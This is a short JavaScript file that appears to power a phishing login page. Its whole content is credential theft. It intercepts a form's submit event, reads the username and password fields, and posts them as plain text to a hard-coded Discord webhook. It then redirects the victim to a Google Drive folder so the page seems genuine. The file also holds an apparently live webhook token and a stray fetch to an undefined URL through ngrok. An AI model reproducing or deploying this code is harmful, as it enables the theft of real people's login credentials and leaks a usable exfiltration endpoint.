const form = document.querySelector("form");
const usernameInput = document.querySelector("input[name='username']");
const passwordInput = document.querySelector("input[name='password']");

form.addEventListener("submit", function(event) {
  event.preventDefault();

  const username = usernameInput.value;
  const password = passwordInput.value;

  const webhookUrl = 'https://discordapp.com/api/webhooks/1042064654735773747/28lZ74xsfZQ0L7Crb5STiR8Gh7U_sTuGfuWGYyTO_RFym1VRpu8PLB9X6gKPuGdfaqI3';
  const message = {
    content: username+ " : "+password
  };
  
  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(message)
  })
  .then(() => {
    window.location = 'https://drive.google.com/drive/folders/1G708Ibqt12OfzVyoNEQ5UQLzoL8DOOEQ?usp=sharing';
  });
  
  fetch(url, {
    method: "get",
    headers: new Headers({
      "ngrok-skip-browser-warning": "69420",
    }),
  })
    .then((response) => response.json())
    .then((data) => console.log(data))
    .catch((err) => console.log(err));
});
